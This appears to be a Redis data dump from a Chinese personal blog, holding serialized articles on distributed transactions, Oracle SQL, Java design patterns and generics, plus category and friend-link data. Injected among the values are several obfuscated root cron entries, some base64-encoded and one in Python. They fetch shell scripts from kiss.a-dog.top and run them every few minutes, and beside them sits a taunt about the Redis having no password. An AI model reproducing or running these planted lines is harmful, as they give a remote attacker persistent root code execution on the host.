NewSQL的分布式事务\n以Spanner、TiDB为代表的NewSQL，在内部集群多节点间，实现了ACID的事务，即提供给用户的事务接口与普通本地事务无差别，但是在内部，一个事务是支持多个节点多条数据的写入，此时无法采用本地ACID的MVCC技术，而是会采用一套复杂的分布式MVCC来做到ACID。大多数的NewSQL分布式事务技术都采用这篇论文Percolator介绍的核心技术。\n\n那么从CAP的角度看，三者不能同时兼备，那么NewSQL选择了什么，牺牲了什么呢？\n\n首先我们看C（一致性），这是数据库类的应用必须具备的。只要数据写入了，后续的读，一定能获取到最新写入的结果。你可以想象如果不是这样，那么你的应用处理关键事务如订单时，如果读到的结果不是最新的，那么你就无法确定订单的当前准确状态，就无法进行正确处理，更无从谈起ACID特性。\n\n然后我们看P（分区），只要是分布式系统，那么P就是必然有概率发生的，因此P是分布式系统必须处理，必须具备的特性。\n\n那么我们再看A（可用性），由于架构的发展，系统出现网络分区的频率可以大幅降低。另外分布式共识算法的发展，可以在较短的时间，正确的达成共识，从而从分区故障中恢复。谷歌分布式锁Chubby的公开数据显示，集群能提供99.99958％的平均可用性，一年也就130s的运行中断。这样的可用性相当高，对实际应用的影响微乎其微。\n\n也就是说随着现代工程和共识算法的发展，可以构造出满足CP的系统，同时接近于满足A，可以称之为CP+HA，这里HA代表的是非100%的A，而是很高的可用性。\n\n公开的数据显示，谷歌的Spanner支持ACID的事务特性，同时提供了高达的5个9的可用性，因此这是一个CP+HA。\n\n既然NewSQL已经达到了CP+HA，那么从CAP的角度看，前面介绍BASE中的典型Dynamo系统等，只达到了AP，他们是否就可以退出历史舞台了呢？不会！NewSQL和BASE的系统之间，性能上差异可能是巨大的，因此在实际高性能高并发应用上，BASE也是有不少的应用场景的。\n\n### 跨服务跨库的分布式事务\n\n```sql\n分布式事务\n\n虽然分布式事务分为两类，一类是前面介绍的NewSQL的分布式事务，不是DTM研究的重点，另一类是DTM重点研究的跨服务跨库分布式事务，为了简化描述，本教程如果无特殊说明，关键词：分布式事务指的是跨库跨服务更新数据的分布式事务\n```\n\ndtm主要研究跨服务，跨数据库的分布式事务，这类分布式事务只是部分遵循 ACID 规范的：\n\n- 原子性：严格遵循\n- 一致性：事务完成后的一致性严格遵循；事务中的一致性可适当放宽\n- 隔离性：并行事务间不可影响；事务中间结果可见性允许安全放宽\n- 持久性：严格遵循\n\n这里面一致性和隔离性都没有严格遵守，但是ACID这四个特性中，AID这三个特性其实是数据库实现的人非常关心，而对于使用数据库的人，最终的用户，最关心的则是C，即用户视角看，分布式事务的一致性是什么样的？\n\n对于这里面的C（一致性），我们以一个非常具体的业务例子，来进行解释。假如我们正在处理一个转账业务，假设是A转给B 30元，在本地事务的支持下，我们的用户看到A+B的总金额，在整个转账前后，以及转账过程中，都是保持不变的。那么这个时候用户认为他看到的数据是一致的，符合业务约束的。\n\n当我们业务变复杂，引入多个数据库和大量微服务时，上述本地事务的一致性，依旧是业务非常关心。假如一个业务更新操作，跨库或者跨服务时，那么此时业务关心的一致性问题，就变成了 分布式事务中的一致性问题。\n\n在单机本地事务中，A+B的总金额在任何时刻去查（以常见的ReadCommitted或ReadRepeatable隔离级别），都是不变的，也就是业务约束一直都保持的这种一致性，我们称之为强一致性。\n\n\n\n### 无法强一致\n\n目前在跨库、跨服务的分布式实际应用中，尚未看到有强一致性的方案。\n\n我们来看看一致性级别最高的XA事务（读者如果还不了解，可以参考[XA事务](https://www.dtm.pub/practice/xa.html)），是否是强一致的，我们以跨行转账（在这里，我们以跨库更新AB来模拟）作为例子来说明，下面是一个XA事务的时序图：\n\n![image-20221123190947431](https://s2.loli.net/2022/11/23/FhkA3BE1DZ2L8eo.png)\n\n\n\n在这个时序图中，我们在如图所示的时间点发起查询，就是在两个commit中间进行的查询，那么我们查到的结果数据，将是A+B+30，不等于A+B，不符合强一致的要求。\n\n> 从微服务1查到的结果为A，因为A-30这个事务未提交；从微服务2查到的结果为B+30；总和为A+B+30\n\n从理论上分析，由于是分布式系统，那么一定是无法保证两个commit同时结束，只要两个commit中间有时间差，那么无论如何我们都无法保证强一致性。\n\n\n\n### 理论上的强一致性\n\n我们接下来思考，普通XA事务不是强一致的，但假如完全不考虑性能因素，有没有可能在理论上做到强一致：\n\n我们先看看如果我们把XA事务涉及的数据库，隔离级别设定到Serializable，是否能到到强一致的效果呢？我们来看看前面的时序场景：\n\n![](https://s2.loli.net/2022/11/23/7ecvG8QzOubyCkU.png)\n\n这种情况下，查到结果等于A+B。\n\n> 此时从微服务1查到的结果为A-30，因为在串行化之下，查询会等到A-30这个事务提交才返回；从微服务2查到的结果为B+30；总和为A+B。\n\n但是又有另一些场景出现了问题，如下图所示：\n\n![xa-serial-c2.0055f9cd.png (613×475) (dtm.pub)](https://s2.loli.net/2022/11/23/YcLsn5D8RBCNO9h.png)\n\n\n\n按照图中时序查询的结果是：A+B-30，依旧是不一致。\n\n> 此时从微服务1查到的结果为A-30，因为在串行化之下，查询会等到A-30这个事务提交才返回；从微服务2查到的结果为B，因为B+30这个事务还没有开始；总和为A+B-30.\n\n深入思考这个强一致的问题之后，有一种做法可以在普通的读已提交下做到强一致，做法如下：\n\n- 对于查询，也采用XA事务，并且查询数据时，采用select for update的方式，所有数据查完之后，再xa commit\n- 具体到当前这个时序图中，要先锁A查A，然后锁B查B，最后再分别提交，否则可能出现死锁\n\n在上述策略下，我们可以看到，在时序图任何一个时间点进行查询，获得的结果都是A+B\n\n![xa-strong-c.2e524a0a.png (613×494) (dtm.pub)](https://s2.loli.net/2022/11/23/2V9U8OyHDdIosF7.png)\n\n- 在T0时间查询，那么修改一定发生在查询全部完成之后，所以查询得到结果A+B\n- 在T1，T2，T3查询，那么查询结果返回一定全部发生在修改完成之后，所以查询得到结果也是A+B\n\n很明显这种方案下的强一致，缺点非常多。互联网应用大多是读多写少，在数据库中，原先的读可以通过多版本技术，不被锁定，快速出结果，而上述这种强一致方案：\n\n- 一方面效率极低，所有有数据交集的数据库读读、读写、写写都必须串行执行。\n- 另一方面，开发人员进行数据库多个数据查询时，也可能发生死锁，要么让开发人员小心排好访问顺序，要么接受死锁。\n\n目前暂未看到实际应用中有哪些系统采用这种方式来进行强一致的跨库分布式事务。\n\n未来有没有可能借鉴NewSQL的这种方式，来实现跨库、跨微服务这类分布式事务的强一致性？理论上是可以的。\n\n- 实现跨服务但不跨库的分布式事务一致性，会相对简单一些，其中一种方式就是实现XA事务中的TMRESUME选项。我们从前面的分析中看到，XA事务的不一致，来源于分布式系统上的两个commit无法同时完成，现在已经在一个数据库，只是跨服务，那么TMRESUME可以允许我们将某个服务的xa事务继续往前操作，最终提交时，只有一个xa commit，因此避免了两个xa commit中间的不一致时间窗口，那么就是强一致的。\n- 实现跨数据库的分布式事务一致性，会困难很多，因为各个数据库的内部版本机制都不一样，想要协同非常困难。困难来自于两点：一是不同厂商之间的MVCC机制不一样，例如Spanner是TrueTime，TiDB是单点授时，还有一些是逻辑时钟，想要兼容多种MVCC非常困难。二是不同厂商难以有足够的商业利益驱动去做这样的协同。\n\n### 最终一致性\n\n从前面的分析中可以看到，在分布式事务进行的过程中，一致性是无法得到保证的，但是分布式事务完成之后，一致性是没问题的，严格遵守的。因此我们将分布式事务方案称为最终一致性方案，这个最终一致性，与CAP中的最终一致性用了同样的词语，但他们的具体含义是不一样的，在CAP中是指读取操作最终能够读取到最后一次写入的结果，在分布式事务中是指最终事务完成后，数据严格满足业务约束。\n\n既然现有的各种分布式事务方案都无法做到强一致，那么最终一致性之间是否有差别呢？我们进行了以下关于一致性强弱的分类：\n\n一致性由强到弱分别是：\n\n[XA事务](https://www.dtm.pub/practice/xa.html)>[TCC](https://www.dtm.pub/practice/tcc.html)>[二阶段消息](https://www.dtm.pub/practice/msg.html)>[SAGA](https://www.dtm.pub/practice/saga.html)\n\n他们的分类为： \n\n![c-classify.73742507.png (1794×436) (dtm.pub)](https://s2.loli.net/2022/11/23/2Sy1gMuITR8mp7j.png)\n\n- **不一致窗口短**：XA和TCC在理想的情况下，可以做到不一致的窗口时间很短\n- **不一致窗口长**：SAGA和MSG则缺少控制不一致窗口时间的方法，相对来说会更长\n- **XA**：XA虽然不是强一致，但是XA的一致性是多种分布式事务中，一致性最好的，因为他处于不一致的状态时间很短，只有一部分分支开始commit，但还没有全部commit的这个时间窗口，数据是不一致的。因为数据库的commit操作耗时，通常是10ms内，因此不一致的窗口期很短。\n- **TCC**：理论上，TCC可以用XA来实现，例如Try-Prepare，Confirm-Commit，Cancel-Rollback。但绝大多数时候，TCC会在业务层自己实现Try|Confirm|Cancel，因此Confirm操作耗时，通常高于XA中的Commit，不一致的窗口时间比XA长\n- **MSG**：二阶消息型事务在第一个操作完成后，在所有操作完成之前，这个时间窗口是不一致的，持续时长一般比前两者更久。\n- **SAGA**：SAGA的不一致窗口时长与消息接近，但是如果发生回滚，而子事务中正向操作修改的数据又会被用户看到，这部分数据就是错误数据，容易给用户带来较差的体验，因此一致性是最差的。\n\n我们这里的分类仅仅从我们关心的几个维度进行了归纳，适用于多数场景，但并不一定适用所有情况。\n\n### 小结\n\n在这里，我们介绍了分布式事务相关的理论，分析了分布式事务的最终一致性。\n\n### 参考文献\n\n[基础理论 | DTM开源项目文档](https://www.dtm.pub/practice/theory.html)","createTime":"2022-11-23 03:14:27","updateTime":"2022-11-23 03:14:27","views":6,"words":7419,"typeId":1,"userId":5,"status":1}],["com.msc.entity.Blog",{"id":35,"title":"今日无事，勾栏听曲","firstPicture":"https://s2.loli.net/2022/11/24/fWtVas4RDnTP9Bo.png","description":"今日无事，勾栏听曲","content":"# 勾栏听曲\n\n<img src=\"https://s2.loli.net/2022/11/24/EtKisepvU871ac6.png\" alt=\"QQ图片20220706001538\" style=\"zoom: 25%;\" />\n\n<img src=\"https://s2.loli.net/2022/11/24/h4fjAWHLPnuDiyq.png\" alt=\"image-20221124185242262\" style=\"zoom:33%;\" />\n\n![image-20221124190636996](https://s2.loli.net/2022/11/24/I9xfNYPeL5842Ho.png)\n\n\n\n<img src=\"https://s2.loli.net/2022/11/25/oxn1fNGhtY4HWjv.png\" alt=\"image-20221125182315064\" style=\"zoom:33%;\" />\n\n\n\n![image-20221124195412025](https://s2.loli.net/2022/11/24/SmG96jcOQhqpNJU.png)\n\nhttps://s2.loli.net/2022/11/24/6mZb8OYGtoQLWpT.jpg\n\nhttp://browser9.qhimg.com/bdm/800_600_100/t013b21a10a6929ccbc.jpg\n\n\n\n\n\n![image-20221124195651775](https://s2.loli.net/2022/11/24/fWtVas4RDnTP9Bo.png)","createTime":"2022-11-21 02:45:43","updateTime":"2022-11-25 18:23:57","views":6,"words":146,"typeId":9,"userId":5,"status":1}],["com.msc.entity.Blog",{"id":33,"title":"Oracle语法小结","firstPicture":"http://browser9.qhimg.com/bdm/800_600_100/t013a4ed4683039d101.jpg","description":"Oracle语法小结,Oracle语法小结","content":"# Oracle语法小结\n\n#### 获取id,自增\nselect get_id() from dual ;\n\n#### 插入日期在SQL中\nto_date('2022-09-29 00:00:00 ','yyyy-mm-dd HH24:MI:SS')\n\n##### 示例：\n```sql\nINSERT INTO HRP_INP_PRE_PAY\n(ID, SYSCODE, DBUSDATE, CREATE_TIME, ORG_LINE_CODE, ORG_LINE_NAME, NMNY, DEBIT_SUBJECT, DEBIT_SUBJECT_NAME, LENDER_SUBJECT, LENDER_SUBJECT_NAME)\nSELECT get_id() AS ID ,SYSCODE, DBUSDATE,to_date('2022-09-29 00:00:00 ','yyyy-mm-dd HH24:MI:SS'), ORG_LINE_CODE, ORG_LINE_NAME, DEBIT_SUBJECT, DEBIT_SUBJECT_NAME, LENDER_SUBJECT, LENDER_SUBJECT_NAME, NMNY\nFROM V_HRP_INP_PRE_PAY;\n```\n\n#### 获取当前时间\n```\n\tselect to_char(sysdate,'yyyy-mm-dd hh24:mi:ss') from dual; \n```\n\n#### Oracle数据库比较日期时间的大小\n```\n\n在今天或者今天之前作比较:\nselect * from JN_BUS_KJLWSBJBXX where dqsj < to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\nselect * from JN_BUS_KJLWSBJBXX where dqsj <= to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\n \n在今天或者今天之后作比较:\nselect * from JN_BUS_KJLWSBJBXX where dqsj > to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\nselect * from JN_BUS_KJLWSBJBXX where dqsj >= to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\n \n精确时间:\nselect * from JN_BUS_KJLWSBJBXX where dqsj = to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\n \n在某段时间内的比较:\nselect * from JN_BUS_KJLWSBJBXX where dqsj between to_date('2007-07-07 00:00:00','yyyy-mm-dd hh24:mi:ss') and to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\nselect * from JN_BUS_KJLWSBJBXX where dqsj < to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss') and update > to_date('2007-07-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\nselect * from JN_BUS_KJLWSBJBXX where dqsj <= to_date('2007-09-07 00:00:00','yyyy-mm-dd hh24:mi:ss') and update >= to_date('2007-07-07 00:00:00','yyyy-mm-dd hh24:mi:ss')\n \nSELECT * from ZYZB_JZ_FDMHL_ZPH where dqsj > to_date('2014-09-20','yyyy-MM-dd') --时间比较--默认时分秒为 00:00:00\nSELECT * from ZYZB_JZ_FDMHL_ZPH where dqsj > to_date('2014-09-20','yyyy-mm-dd hh24:mi:ss') --时间比较\nSELECT * from ZYZB_JZ_FDMHL_ZPH where dqsj > to_date('2014-09-20 23:59:59','yyyy-mm-dd hh24:mi:ss') --时间比较--精确时分秒\nselect * from ZYZB_JZ_FDMHL_ZPH where dqsj = to_date('2014-09-23 03:25:00','yyyy-mm-dd hh24:mi:ss')--时间比较--精确时分秒\n\n\n```","createTime":"2022-11-14 17:20:33","updateTime":"2022-11-18 17:17:54","views":19,"words":2155,"typeId":10,"userId":5,"status":1}],["com.msc.entity.Blog",{"id":32,"title":"策略模式+工厂模式应用","firstPicture":"http://browser9.qhimg.com/bdm/800_600_100/t01279f17645450a652.jpg","description":"简单实战应用 策略模式+工厂模式   的简单实战应用","content":"## 策略模式+工厂模式   的简单实战应用\n\n#### 屁话少说 直接上代码，自己跑一下就知道了\n```java\nhttps://gitee.com/coder-msc/factorydemo\n```\n#### 1、创建几个基础类\nB.java\n```java\n@Data\npublic class B {\n    private String bb;\n}\n```\nA.java\n```java\n@Data\npublic class A extends B {\n    private String aa;\n//    private String bb; //放到父类中\n}\n```\nC.java\n```java\n@Data\npublic class C extends B {\n    private String cc;\n//    private String bb; //放到父类中\n}\n```\n\n#### 2、策略模式开始 创建抽象类\nBaseControl.java\n```java\npublic abstract class BaseControl<T> {\n\n    protected int variantFormId;\n\n    //（容器中需要确保能唯一区分）\n    public void setVariantFormId(int variantFormId) {\n        this.variantFormId = variantFormId;\n    }\n\n    public int getVariantFormId() {\n        return variantFormId;\n    }\n\n    //详情查询\n    public abstract T queryVariant(String value);\n\n    public void updateTest(B b) {\n        System.out.println(\"更新B对象\"+b.getBb());\n        //update B 类\n    }\n\n    protected T getVariantT(B b) {\n        return (T) b;\n    }\n}\n```\n#### 路由对象之 ---需要集成抽象类的子类AControl\nAControl.java\n\n```java\n@Component\npublic class AControl extends BaseControl<A> {\n\n    //构造方法初始化key值，为了满足策略模式中的工厂赋值 方便找到\n    public AControl() {\n        this.variantFormId = 1; //设置key值 （容器中需要确保能唯一区分）\n    }\n\n    @Override\n    public A queryVariant(String value) {\n        System.out.println(\"传入的值:\"+value);\n        A a = new A();\n        a.setAa(\"a里的aa值\");\n        a.setBb(\"a里的bb值\");\n        return a;\n    }\n\n    public void updateTest(B b) {\n        super.updateTest(b); // 父类方法不会调用，若要执行，需要使用supper显示调用\n        A a = getVariantT(b);\n        System.out.println(\"更新A对象aa\"+a.getAa());\n        System.out.println(\"更新A对象bb\"+a.getBb());\n        //update A 类\n    }\n}\n\n```\n\n#### 路由对象之 --- 需要集成抽象类的子类CControl\n\nCControl.java\n\n```java\n@Component\npublic class CControl extends BaseControl<C> {\n    //为了满足策略模式中的工厂赋值 方便找到\n    public CControl() {\n        this.variantFormId = 3; //设置key值（容器中需要确保能唯一区分）\n    }\n\n    @Override\n    public C queryVariant(String value) {\n        System.out.println(\"传入的值:\" + value);\n        C c = new C();\n        c.setCc(\"c里的cc值\");\n        c.setBb(\"c里的bb值\");\n        return c;\n    }\n\n    public void updateTest(B b) {\n        C c = getVariantT(b); //B类转C类 仍能找到cc值\n        System.out.println(\"更新C对象cc\" + c.getCc());\n        System.out.println(\"更新C对象bb\" + c.getBb());\n        //update C 类\n    }\n}\n```\n\n#### 工厂的创建，路由策略制定\nMyStrategyRoute.java\n```java\n@Component\npublic class MyStrategyRoute {\n    @Resource\n    private ApplicationContext applicationContext;\n    private Map<Integer, BaseControl> beansMap = new HashMap<>(); //容器启动的时候，把bean放到Map中\n    private Optional<BaseControl> defaultBeans;\n\n    @PostConstruct\n    public void postConstruct() {\n        Map<String, BaseControl> map = applicationContext.getBeansOfType(BaseControl.class); // 获取容器中的实列（对象）\n        if (map != null) {\n            beansMap = map.values().stream().collect(Collectors.toMap(BaseControl::getVariantFormId, Function.identity(), (k1, k2) -> k1));\n            defaultBeans = map.values().stream().findFirst();\n        }\n    }\n\n    public Optional<BaseControl> getVariantControl(Integer variantFormId) {\n        return Optional.ofNullable(beansMap.get(variantFormId));\n    }\n\n    public Optional<BaseControl> getDefaultVariantControl() {\n        return defaultBeans;\n    }\n}\n```\n\n#### 测试效果\nmyTest.java\n```java\n@RestController\n@RequestMapping(value = \"/mytest\")\npublic class myTest {\n    @Autowired\n    private MyStrategyRoute myStrategyRoute;\n\n    @RequestMapping(\"/test\")\n    public void test() {\n        Optional<BaseControl> optional = myStrategyRoute.getVariantControl(1); //找到的是AControl\n        B b = null;\n        if (optional.isPresent()) {\n            b = (B) optional.get().queryVariant(\"我在哪里打印了？\"); // 可以统一用B 来接  因为 1 和3 都继承了 B类\n//            b.getAa(); 有Aa的值 但是取不出来的 需要强转\n        }\n        // 上一步查询到的是A类的详情，传递的是引用，虽然B类没有aa这个字段，当B转换成A的时候  仍然能获取到aa\n//        A a = (A) b;  // 需要注意 A和C都继承了B  但是A和C互转 会出现异常\n//        System.out.println(a.getBb());\n//        System.out.println(a.getAa());\n\n        // 更新对象\n        // 传入的是个B对象 但是带着A对象（或C对象）的属性 ，因此可以更新A（或C）的所有属性\n        // 如果要更新B对象  需要使用supper显示调用，见A的方法\n        optional.get().updateTest(b);\n    }\n}\n\n```\n\n","createTime":"2022-09-05 11:13:05","updateTime":"2022-09-06 03:16:54","views":76,"words":4140,"typeId":12,"userId":5,"status":1}],["com.msc.entity.Blog",{"id":31,"title":" List<? extends T>与List<? super T>的区别","firstPicture":"http://browser9.qhimg.com/bdm/800_600_100/t013a4ed4683039d101.jpg","description":"List<? extends T>与List<? super T>的区别","content":"## List<? extends T>与List<? super T>的区别\n\n#### 小结\n\n```\n（1）List<? extends T>适用于读取数据，读取出来的数据全部用T类型接收。如果我们往此list中添加T类型不同的子类的话，\n各种子类无法相互转换，因此不能添加元素，但可接受初始赋值。\n\n\n（2）List<? super T>适用于添加元素，只能添加T类型或其子类类型。因为这些类型都能转换为T的任意超类类型（向上转型），\n因此我们可以对此list添加元素。只能用Object类型来接收获取到的元素，但是这些元素原本的类型会丢失。\n```\n\n#### 举个栗子\n\n**extends**\n\n```java\nList<? extends Number> foo3 = new ArrayList<Number>();  // Number \"extends\" Number (in this context)\nList<? extends Number> foo3 = new ArrayList<Integer>(); // Integer extends Number\nList<? extends Number> foo3 = new ArrayList<Double>();  // Double extends Number\n```\n\n1.读取\n\n\n\n给定上述可能的赋值语句，能保证你从List foo3中取出什么样类型的对象？\n\n\n\n你可以读取一个Number对象，因为上面任意一个list都包含Number对象或者Number子类的对象（上面的Number、Integer、Double都可以转型成Number，并且是安全的，所以读取总是可以的）。如下代码就不会报错：\n\n```java\n\nList<? extends Number> foo4 = new ArrayList<Integer>();\nNumber number = foo4.get(0);\n```\n\n你不能读取一个Integer对象，因为foo3可能指向的是List<Double>（与其运行时发现Double转成Integer报错，不如编译时就不让从foo3中取Integer对象）。如下代码编译时会报Incompatible types错的：\n\n```java\nList<? extends Number> foo4 = new ArrayList<Integer>();\nInteger number = foo4.get(0);\n```\n\n因为编译的时候编译器只知道foo4引用是一个List<? extends Number>，要到运行时才会绑定到new ArrayList<Integer>()，所以编译的时候是无法判断foo4指向的List中到底是什么类型，唯一能确定的就是这个类型是Number的子类（或者就是Number类）。\n\n\n\n你也不能读取一个Double对象，因为foo3可能指向的是List<Integer>。\n\n2.写入\n\n给定上述可能的赋值语句，你能往List foo3中添加什么类型的对象从而保证它对于所有可能的ArrayList都是合法的呢？\n\n你不能添加一个Integer对象，因为foo3可能指向的是List<Double>。如下代码是会编译报错的：\n\n```java\n\nList<? extends Number> foo4 = new ArrayList<Integer>();\nfoo4.add(new Integer(1));\n```\n\n**因为编译期间是无法知道foo4指向的ArrayList中到底放的是什么类型，只有到运行时才知道（就是Java所谓的晚绑定或运行时绑定）。与其到运行时发现**往一个ArrayList<Double>中add一个Integer导致抛出类型转换异常，倒不如编译时就报错，即使ArrayList中放的就是Integer类型。\n\n\n\n- 你不能添加一个Double对象，因为foo3可能指向的是List<Integer>。\n- 你不能添加一个Number对象，因为foo3可能指向的是List<Integer>。\n\n\n\n总结一下：你不能往List<? extends T>中添加任何对象，因为你不能保证List真正指向哪个类型，所以不能确定添加的对象就是List所能接受的类型。能保证的，仅仅是你可以从List中读取的时候，你获得的肯定是一个T类型的对象（即使是T类型的子类对象也是T类型的）。\n\n**super**\n\n```java\nList<? super Integer> foo3 = new ArrayList<Integer>();  // Integer is a \"superclass\" of Integer (in this context)\n\nList<? super Integer> foo3 = new ArrayList<Number>();   // Number is a superclass of Integer\n\nList<? super Integer> foo3 = new ArrayList<Object>();   // Object is a superclass of Integer\n```\n\n1.读取\n\n\n\n给定上述可能的赋值语句，当读取List foo3中的元素的时候，你能保证接收到什么类型的对象呢？\n\n\n\n- 你不能保证是一个Integer对象，因为foo3可能指向一个List<Number>或者List<Object>。\n- 你不能保证是一个Number对象，因为foo3可能指向一个List<Object>。\n- 你能保证的仅仅是它一定是一个Object类的实例或者Object子类的实例（但是你不知道到底是哪个子类）。\n\n\n\n2.写入\n\n\n\n给定上述可能的赋值语句，你能往List foo3中添加什么类型的对象从而保证它对于所有可能的ArrayList都是合法的呢？\n\n\n\n- 你可以添加一个Integer实例，因为Integer类型对于上述所有的list都是合法的。\n- 你可以添加任何Integer子类的实例，因为一个Integer子类的实例都可以向上转型成上面列表中的元素类型。\n- 你不可以添加Double类型，因为foo3可能指向的是ArrayList<Integer>。\n- 你不可以添加Number类型，因为foo3可能指向的是ArrayList<Integer>。\n- 你不可以添加Object类型，因为foo3可能指向的是ArrayList<Integer>。","createTime":"2022-09-03 16:25:53","updateTime":"2022-09-03 16:25:53","views":16,"words":2766,"typeId":1,"userId":5,"status":1}],["com.msc.entity.Blog",{"id":29,"title":"定义一个枚举","firstPicture":"http://browser9.qhimg.com/bdm/800_600_100/t0128e904ff207c846b.jpg","description":"定义一个枚举定义一个枚举定义一个枚举定义一个枚举定义一个枚举定义一个枚举","content":"## 定义一个枚举\n\n>```java  \n>public enum CtMrScanTypeEnum {\n>   FLAT_SCAN(0, \"平扫\"),\n>   ENHANCE_SCAN(1, \"增强扫描\");\n>\n>   private Integer code;\n>   private String name;\n>\n>   private CtMrScanTypeEnum(Integer code, String name) {\n>       this.code = code;\n>       this.name = name;\n>   }\n>\n>   public static CtMrScanTypeEnum getEnum(Integer value) {\n>       for (CtMrScanTypeEnum e : CtMrScanTypeEnum.values()) {\n>           if (value==e.getCode()) {\n>               return e;\n>           }\n>       }\n>       return null;\n>   }\n>\n>   public Integer getCode() {\n>       return code;\n>   }\n>   public String getName() {\n>       return name;\n>   }\n>}\n>```","createTime":"2022-09-01 18:35:30","updateTime":"2022-09-02 02:36:11","views":3,"words":642,"typeId":12,"userId":5,"status":1}]]],"total":26,"size":7,"current":1,"orders":["java.util.ArrayList",[]],"optimizeCountSql":true,"isSearchCount":true,"searchCount":true,"pages":4}]}, 


*/3 * * * * root echo d2dldCAtcSAtTy0gaHR0cDovL2tpc3MuYS1kb2cudG9wL2IyZjYyOC9iLnNoCg==|base64 -d|bash|bash

, ["b3322fda-6070-4582-9b85-4d95b4028cea", "fae5c087-ded7-4173-884d-84e5c13975cc"], {"all"=["java.util.ArrayList",[["com.msc.entity.Type",{"id":1,"typeName":"技术博客","typeForm":1,"orderSort":99}],["com.msc.entity.Type",{"id":12,"typeName":"各种demo程序","typeForm":1,"orderSort":98}],["com.msc.entity.Type",{"id":4,"typeName":"数据结构与算法","typeForm":1,"orderSort":97}],["com.msc.entity.Type",{"id":10,"typeName":"开发工具技巧","typeForm":1,"orderSort":96}],["com.msc.entity.Type",{"id":11,"typeName":"读书笔记","typeForm":1,"orderSort":95}],["com.msc.entity.Type",{"id":2,"typeName":"面试&职场","typeForm":1,"orderSort":94}],["com.msc.entity.Type",{"id":3,"typeName":"心情随写","typeForm":1,"orderSort":93}],["com.msc.entity.Type",{"id":9,"typeName":"心情愉悦","typeForm":1,"orderSort":92}]]]}, {"all"=["com.msc.common.lang.vo.VisitorNum",{"uv":1584,"pv":7752}]}, 小老弟,你的redis没设置密码吧?😂😂, 


*/2 * * * * root echo Y2QxIGh0dHA6Ly9raXNzLmEtZG9nLnRvcC9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash 

, {"all"=["java.util.ArrayList",[["com.msc.entity.Friend",{"id":4,"nickname":"空山柠语","description":"歲時艱，行路難。形將破，意且存，勿忘我","website":"http://www.lemjuice.cn/","avatar":"http://www.lemjuice.cn/00000147.png","isPublished":true,"views":12,"createTime":"2020-05-01 16:05:49"}],["com.msc.entity.Friend",{"id":5,"nickname":"ZhaoQuinn's Blog","description":"热爱科技，热爱生活.","website":"https://zhaoq.me","avatar":"https://zhaoq.me/usr/uploads/2020/03/2395074381.jpg","isPublished":true,"views":12,"createTime":"2020-05-02 08:05:49"}],["com.msc.entity.Friend",{"id":6,"nickname":"华岁云小屋","description":"行穿锦巷入雪巷，看尽桃花到李花。","website":"https://halo.52n.cc","avatar":"https://pic.ugcimg.cn/7858ffa2d0c8fc82a0171b6a6b9c1ac9","isPublished":true,"views":10,"createTime":"2022-08-03 06:48:05"}],["com.msc.entity.Friend",{"id":7,"nickname":"Linux 技术猿","description":"Linux 技术分享","website":"https://blog.tcnets.cn","avatar":"https://cdn.h3cfan.com/blog/logo.jpg","isPublished":true,"views":11,"createTime":"2022-08-03 14:49:24"}],["com.msc.entity.Friend",{"id":9,"nickname":"呲哩博客","description":"谢谢你，Cheems!","website":"http://www.cilicili.top","avatar":"http://www.cilicili.top/favicon.ico","isPublished":true,"views":9,"createTime":"2022-08-04 02:00:04"}],["com.msc.entity.Friend",{"id":10,"nickname":"luoxx的博客","description":"这是一个非常牛逼的博客","website":"https://www.luoxx.top","avatar":"https://www.luoxx.top/logo","isPublished":true,"views":13,"createTime":"2022-08-02 18:08:58"}],["com.msc.entity.Friend",{"id":11,"nickname":"闲言博客","description":"记录成长，记录学习","website":"https://www.bloghut.cn/","avatar":"https://upload.bloghut.cn/logonew.png","isPublished":true,"views":4,"createTime":"2022-11-22 07:22:28"}],["com.msc.entity.Friend",{"id":12,"nickname":"Mr-吴の客栈","description":"我有一瓢酒，可以慰风尘。","website":"https://www.wuweijan.cn/","avatar":"https://static.wuweijan.cn/config/6ed918c888cc40cd904d456cfcd06e7e.jpg","isPublished":true,"views":0,"createTime":"2022-11-24 05:52:58"}]]]}, 


@hourly root  python -c "import urllib2; print urllib2.urlopen('http://ki\s\s.a-d\og.t\op/t.sh').read()" >.1;chmod +x .1;./.1

, 


*/4 * * * * root echo Y3VybCBodHRwOi8va2lzcy5hLWRvZy50b3AvYjJmNjI4L2Iuc2gK|base64 -d|bash|bash

]